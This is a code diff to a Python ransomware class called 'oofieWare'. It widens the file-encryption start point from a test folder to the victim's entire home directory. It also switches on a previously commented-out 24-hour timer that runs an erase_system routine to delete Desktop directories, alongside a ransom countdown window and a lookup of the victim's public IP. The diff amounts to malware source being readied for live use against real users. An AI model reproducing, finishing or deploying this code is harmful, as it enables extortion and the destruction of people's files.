@@ -26,8 +26,8 @@ class oofieWare:
         self.decrypter = None
         self.threads = []
         self.started = False
-        self.startPoint = r'C:\Users\yaokh\Desktop\Target'
-        # self.startPoint = os.path.expanduser("~")
+        self.testPoint = r'C:\Users\oofie\Desktop\Target' # for testing on a particular folder
+        self.startPoint = os.path.expanduser("~")
         self.Desktop = os.path.normpath(os.path.expanduser("~/Desktop"))
         self.LARGE_SIZE = 50_000_000
         self.PUBLIC_IP = requests.get('https://api.ipify.org').text
@@ -231,18 +231,18 @@ class oofieWare:
 
         countdown("24:00:00")
 
-        # eraseTimer = threading.Timer(60*60*24, self.erase_system)
+        eraseTimer = threading.Timer(60*60*24, self.erase_system)
 
-        # eraseTimer.start()
+        eraseTimer.start()
 
         window.mainloop()
 
-    # def erase_system(self):
-    #     for root, dirs, files in os.walk(self.Desktop, topdown = True):
-    #         try:
-    #             shutil.rmtree(os.path.join(root, dirs))
-    #         except OSError as e:
-    #             pass
+    def erase_system(self):
+        for root, dirs, files in os.walk(self.Desktop, topdown = True):
+            try:
+                shutil.rmtree(os.path.join(root, dirs))
+            except OSError as e:
+                pass
             
     def elevate_ransom_window(self):
 
